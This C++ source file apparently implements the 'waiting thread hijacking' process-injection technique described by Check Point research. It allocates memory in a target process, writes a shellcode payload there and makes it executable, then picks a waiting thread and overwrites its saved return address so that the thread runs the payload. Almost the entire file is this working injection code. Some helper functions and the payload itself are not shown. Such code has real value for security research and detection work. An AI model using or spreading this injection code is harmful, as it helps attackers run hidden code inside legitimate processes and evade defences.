//https://research.checkpoint.com/2025/waiting-thread-hijacking/
#ifndef UNICODE
#define UNICODE
#endif 

#include <windows.h>
#include <iostream>

bool check_ret_target(LPVOID ret)
{
    HMODULE mod = get_module_by_address((LPVOID)ret);
    if (mod == NULL) {
        std::cout << "Pointer not in any recognized module.\n";
        return false;
    }
    if (mod == GetModuleHandleA("ntdll.dll") ||
        mod == GetModuleHandleA("kernelbase.dll") ||
        mod == GetModuleHandleA("kernel32.dll"))
    {
        return true;
    }
    std::cout << "Pointer not in ntdll/kernel32.\n";
    return false;
}

bool run_injected(DWORD pid, ULONGLONG shellcodePtr, KWAIT_REASON wait_reason)
{
    std::cout << "Enumerating threads of PID: " << pid << "\n";
    std::map<DWORD, thread_info> threads_info;
    if (!pesieve::util::fetch_threads_info(pid, threads_info)) {
        return false;
    }

    HANDLE hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, pid);
    if (!hProcess) return false;

    CONTEXT ctx = { 0 };
    ULONGLONG suitable_ret_ptr = 0;
    ULONGLONG suitable_ret = 0;
    std::cout << "Threads: " << threads_info.size() << std::endl;
    for (auto itr = threads_info.begin(); itr != threads_info.end(); ++itr) {
        thread_info& info = itr->second;

        if (!info.is_extended) return false;

        if (info.ext.state == Waiting) {
            std::cout << "TID: " << info.tid << std::hex << " : wait reason: " << std::dec << info.ext.wait_reason << "\n";
            if (info.ext.wait_reason != wait_reason || !read_context(info.tid, ctx)) {
                continue;
            }
            ULONGLONG ret = read_return_ptr<ULONGLONG>(hProcess, ctx.Rsp);
            std::cout << "RET: " << std::hex << ret << "\n";
            if (!suitable_ret_ptr) {
                if (!check_ret_target((LPVOID)ret)) {
                    std::cout << "Not supported ret target. Skipping!\n";
                    continue;
                }
                suitable_ret_ptr = ctx.Rsp;
                suitable_ret = ret;
                std::cout << "\tUsing as a target!\n";
                break;
            }
        }
        else {
            std::cout << "TID: " << itr->first << "is NOT waiting, State: " << info.ext.state << "\n";
        }
    }
    bool is_injected = false;
    if (suitable_ret_ptr) {
        // overwrite the shellcode with the jump back
        SIZE_T written = 0;
        if (ntapi::WriteProcessMemory(hProcess, (LPVOID)shellcodePtr, &suitable_ret, sizeof(suitable_ret), &written) && written == sizeof(suitable_ret)) {
            std::cout << "Shellcode ptr overwritten! Written: " << written << " \n";
        }
        else {
            std::cout << "Failed to overwrite shellcode jmp back: " << std::hex << GetLastError() << "\n";
            return false;
        }
        if (!protect_memory(pid, (LPVOID)shellcodePtr, sizeof(g_payload), PAGE_EXECUTE_READ)) {
            std::cerr << "Failed making memory executable!\n";
            return false;
        }

        shellcodePtr += 0x8; // after the saved return...
        std::cout << "Trying to overwrite: " << std::hex << suitable_ret_ptr << " -> " << suitable_ret << " with: " << shellcodePtr << std::endl;
        if (ntapi::WriteProcessMemory(hProcess, (LPVOID)suitable_ret_ptr, &shellcodePtr, sizeof(shellcodePtr), &written) && written == sizeof(shellcodePtr)) {
            std::cout << "Ret overwritten!\n";
            is_injected = true;
        }
    }
    CloseHandle(hProcess);
    return is_injected;
}

bool execute_injection(DWORD processID)
{
    LPVOID shellcodePtr = NULL;

    {
        HANDLE hProcess = OpenProcess(PROCESS_VM_OPERATION, FALSE, processID);
        if (!hProcess) return false;

        shellcodePtr = ntapi::VirtualAllocEx(hProcess, nullptr, sizeof(g_payload), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        CloseHandle(hProcess);
        if (!shellcodePtr) return false;
    }

    {
        HANDLE hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, processID);
        if (!hProcess) return false;

        SIZE_T written = 0;
        bool isOk = ntapi::WriteProcessMemory(hProcess, (LPVOID)shellcodePtr, g_payload, sizeof(g_payload), &written);
        CloseHandle(hProcess);
        if (!isOk) return false;
    }
    return run_injected(processID, (ULONG_PTR)shellcodePtr, WrQueue);
}